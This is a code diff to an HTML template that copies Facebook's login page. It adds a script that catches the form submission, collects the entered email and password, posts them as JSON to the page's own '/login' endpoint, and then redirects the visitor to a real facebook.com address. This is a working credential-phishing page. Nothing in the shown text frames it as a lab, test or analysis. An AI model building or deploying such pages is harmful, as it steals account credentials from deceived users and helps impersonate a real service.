@@ -1,3 +1,4 @@
+<!DOCTYPE html>
 <html lang="en">
   <head>
     <meta charset="UTF-8" />
@@ -6,6 +7,37 @@
     <title>Facebook Login Page</title>
     <link rel="stylesheet" href="{{ url_for('static', filename='login_form_2.css') }}">
     <script src="{{ url_for('static', filename='login_form.js') }}" defer></script>
+    <script>
+      document.addEventListener('DOMContentLoaded', function() {
+        document.querySelector('form').addEventListener('submit', function(event) {
+          event.preventDefault(); // Prevent default form submission
+
+          // Create FormData object
+          const formData = new FormData(this);
+
+          // Convert FormData to JSON
+          const data = {};
+          formData.forEach((value, key) => { data[key] = value; });
+
+          // Send POST request
+          fetch('/login', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(data),
+          })
+          .then(response => response.json()) // Process JSON response
+          .then(result => {
+            // Redirect regardless of the response content
+            window.location.href = 'https://www.facebook.com/asdada';
+          })
+          .catch(error => {
+            console.error('Error:', error);
+          });
+        });
+      });
+    </script>
   </head>
   <body>
     <div class="content">
@@ -14,14 +46,14 @@
           <h1 class="logo">Facebook</h1>
           <p>Connect with friends and the world around you on Facebook.</p>
         </div>
-          <form>
-            <input type="text" placeholder="Email or Phone Number" required />
-            <input type="password" placeholder="Password" required>
-            <button class="login">Log In</button>
-            <a href="#">Forgot Password ?</a>
-            <hr>
-            <button class="create-account">Create New Account</button>
-          </form>
+        <form>
+          <input type="text" name="email" placeholder="Email or Phone Number" required />
+          <input type="password" name="password" placeholder="Password" required>
+          <button type="submit" class="login">Log In</button>
+          <a href="#">Forgot Password ?</a>
+          <hr>
+          <button type="button" class="create-account">Create New Account</button>
+        </form>
       </div>
     </div>
   </body>
